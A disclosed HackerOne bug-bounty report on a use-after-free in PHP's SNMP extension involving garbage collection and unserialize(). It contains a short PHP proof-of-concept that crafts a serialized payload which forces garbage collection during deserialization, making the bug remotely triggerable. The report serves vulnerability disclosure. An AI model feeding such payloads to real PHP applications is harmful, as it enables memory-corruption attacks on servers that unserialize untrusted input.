# Use After Free Vulnerability in SNMP with GC and unserialize()

## Report Details
- **Report ID**: 152266
- **URL**: https://hackerone.com/reports/152266
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-19T11:30:23.197Z
- **Disclosed**: 2019-10-13T11:07:15.510Z

## Reporter
- **Username**: ryat
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
https://bugs.php.net/bug.php?id=72479

P.S. This bug can be triggered remotely without call to the gc_collect_cycles() since GC can also be invoked automatically in during deserialization. Like the following code:

```
<?php

$xxx = [];
for ($i = 0; $i < 10000; $i++) {
	$xxx[$i] = [[]];
	$xxx[$i][0] = &$xxx[$i];
}

$arr = ['xxx' => $xxx, 'yyy' => 1];
$call_gc_poc = str_replace('yyy', 'xxx', serialize($arr));
unserialize($call_gc_poc);

?>
```

## Attachments
No attachments
